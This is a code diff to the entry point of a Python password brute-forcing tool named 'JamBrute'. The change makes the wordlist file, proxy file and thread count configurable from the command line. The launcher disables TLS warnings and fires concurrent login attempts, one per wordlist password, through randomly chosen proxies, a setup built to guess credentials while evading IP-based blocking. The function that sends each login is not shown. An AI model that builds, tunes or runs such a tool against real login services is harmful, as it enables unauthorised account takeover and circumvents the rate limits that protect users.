@@ -8,10 +8,14 @@ import urllib3
 from src.login_reqs import LoginRequests
 from src.wordlist import Wordlist
 from src.proxyloader import ProxyLoader
+from src.cli import parse_arguments
+
 
 def start() -> None:
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
     colorama.init(autoreset = True)
+    
+    args = parse_arguments()
     
     # ascii banner
     text = "JamBrute"
@@ -19,17 +23,17 @@ def start() -> None:
     print(colored(ascii_art, 'red'))
 
     
-    # initialize objects 
+    # store objects in variables
     login = LoginRequests()
-    wordlist = Wordlist()
-    proxy_list = ProxyLoader()
+    wordlist = Wordlist(wordlist_file=args.wordlist)
+    proxy_list = ProxyLoader(proxy_file=args.proxy)
     proxy_list.load_proxies() 
     wordlist.open_wordlist()
     
     # execute threads
-    max_concurrent_workers = 4
-    with ThreadPoolExecutor(max_workers = max_concurrent_workers) as worker:
-        for password in wordlist.passwords: # iterate through the wordlist array of passwords
+    
+    with ThreadPoolExecutor(max_workers = args.threads) as worker:
+        for password in wordlist.passwords: #iterate through the wordlist array of passwords
             proxy = random.choice(proxy_list.proxy_list) if proxy_list.proxy_list else None # random selection from list
             worker.submit(login.send_login, password, proxy) # submit the threads to executor with login method and password +proxy parameters
     
